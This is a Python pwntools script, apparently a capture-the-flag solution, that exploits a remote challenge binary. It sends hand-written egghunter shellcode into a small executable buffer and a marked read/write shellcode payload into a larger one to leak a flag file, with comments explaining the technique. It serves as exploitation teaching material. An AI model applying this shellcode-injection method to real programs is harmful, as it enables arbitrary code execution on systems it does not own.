#!/usr/bin/env python3
from pwn import *

# Before creating the script:

# When running this binary, it states that I am given two buffers on the stack,
# one large and one small. It also says it will execute whatever I place in the first
# buffer, yet not the second. Finally it says all syscalls are disabled except read
# and write, and the flag is in a file with fd 1000.

# Since this is similar to the simple challenge, I am going to want to run the same
# shellcode I created there to read and write the contents of the flag file.

# However, this shellcode is too large to fit on the small buffer which gets executed.
# Since we have a small buffer as well as a larger buffer we can write into 
# somewhere else on the stack, this follows the pattern of an egghunter.

# In the small buffer, we place egghunter shellcode which iterates through memory 
# looking for an egg. In the large buffer, we place this egg value followed by our 
# larger shellcode that gets the flag. Hence, when my egghunter shellcode finds the 
# egg value in memory, it will then execute my shellcode placed directly after it.

# The script:
p = remote("plsdonthaq.me", 3003)

# Here we create the egg value 0xfcfcfcfc, as this is unlikely to appear naturally
# in memory.
egg = p32(0xfcfcfcfc)

# Next, we create the shellcode for the egghunter. First it moves our egg value
# into the edx register. It then enters a loop where it increments the eax register
# by 1, compares the value at this address with our egg, and if not equal jumps back
# to the top of the loop. If it was equal, then we want to jump to start executing
# our shellcode placed after the egg.
egghunter = asm("""
mov edx, 0xfcfcfcfc
loop:
  inc eax
  cmp DWORD PTR [eax], edx
  jne loop
  jmp eax
""")

# NOTE: pwntools offers their own egghunter, however it only looks on 4-byte
# alignments. Hence, when using this it may fail several times before succeeding.
#context.arch = 'i386'
#egghunter = asm(shellcraft.stackhunter(0xabcd1234))

# This is the assembly for the pwntools egghunter above.
#egghunter = asm("""
#egghunter:
#  pop eax
#  cmp eax, 0xfcfcfcfc
#  jne egghunter
#  jmp esp 
#""")


# This is the shellcode to read and write the contents of the flag file. Since it is
# setup the same as the simple challenge, we have simply used the same assembly here.
shellcode = asm("""
sub esp, 500
mov ebx, 1000
lea ecx, [esp]
mov edx, 500
mov eax, 0x03
int 0x80

mov ebx, 1
lea ecx, [esp]
mov edx, eax
mov eax, 0x04
int 0x80
""")

# We first input the egghunter shellcode into the small buffer.
p.sendline(egghunter)

# And we send the egg followed by our read and write shellcode into the large buffer.
p.sendline(egg+shellcode)

p.interactive()